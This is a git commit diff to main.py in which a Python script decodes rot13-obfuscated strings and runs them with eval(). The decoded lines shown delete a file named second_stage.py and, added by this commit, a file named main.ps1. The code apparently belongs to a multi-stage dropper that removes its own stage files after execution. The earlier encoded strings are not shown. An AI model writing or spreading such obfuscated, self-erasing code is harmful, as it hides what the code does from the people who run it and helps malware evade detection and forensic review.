1fe5976d4d2dbe2ef29c10cb050a146535ec9829
fluffyleach98765 <123709719+fluffyleach98765@users.noreply.github.com>
2023-01-27 08:20:41 +0000

    Update main.py

--- main.py
+++ main.py
@@ -13,9 +13,15 @@ third = '''
 bf.erzbir("frpbaq_fgntr.cl")
 '''
 
+fourth = '''
+bf.erzbir("znva.cf1")
+'''
+
 first_decoded = codecs.decode(first, 'rot13')
 second_decoded = codecs.decode(second, 'rot13')
 third_decoded = codecs.decode(third, 'rot13')
+fourth_decoded = codecs.decode(fourth, 'rot13')
 eval(first_decoded)
 eval(second_decoded)
 eval(third_decoded)
+eval(fourth_decoded)
